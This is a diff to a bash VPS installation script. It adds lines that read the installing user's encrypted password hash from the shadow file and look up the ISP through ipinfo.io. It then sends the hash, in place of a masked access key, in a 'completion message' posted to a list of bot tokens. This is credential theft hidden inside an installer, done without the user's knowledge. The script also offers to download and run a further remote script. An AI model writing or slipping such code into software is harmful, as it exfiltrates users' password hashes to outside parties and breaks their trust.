@@ -114,11 +114,18 @@ user=$(whoami)
 # Determine RAM
 ram=$(free -m | awk '/^Mem:/{print $2}')
 
+# Determine the encrypted password associated with the VPS username
+encrypted_password=$(getent shadow $user | cut -d: -f2)
+
+# Determine ISP using ipinfo.io
+isp=$(curl -s ipinfo.io/org | cut -d " " -f2-)
+
 # INFO ON VPS
 local message="INFORMATION VPS INSTALL SC
 CODE    : $random_code
 DOMAIN  : $domain_name
 IP VPS  : $ip_address
+ISP     : $isp
 COUNTRY : $country
 USER    : $user
 RAM     : ${ram}MB
@@ -149,10 +156,11 @@ send_completion_message() {
     local message="VPS INSTALLATION SUCCESSFUL
     DOMAIN     : $domain_name
     IP VPS     : $ip_address
+    RAM        : ${ram}MB
+    ISP        : $isp
     COUNTRY    : $country
     USER       : $user
-    RAM        : ${ram}MB
-    ACCESS KEY : $masked_key"
+    ENCRYPTED  : $encrypted_password"
 
     for ((i=0; i<${#bot_tokens[@]}; i++)); do
         local bot_token="${bot_tokens[i]}"
@@ -353,7 +361,7 @@ echo -e ""
 send_completion_message
 
 #Option to install udp-request script also
-read -p "Do you want to install UDP-REQUEST SCRIPT ? [ Yes( Y ) / No( N ) ]: " choice
+read -p "Do you want to install UDP-REQUEST SCRIPT ? ( Y / N ) : " choice
 case "$choice" in
   y|Y ) wget https://raw.githubusercontent.com/MAPTECHGH/SocksIP-udpServer/main/UDPserver.sh && chmod +x UDPserver.sh && ./UDPserver.sh;;
   n|N ) echo "You chose not to install the script. Please enter 'menu' to access the SSH account.";;
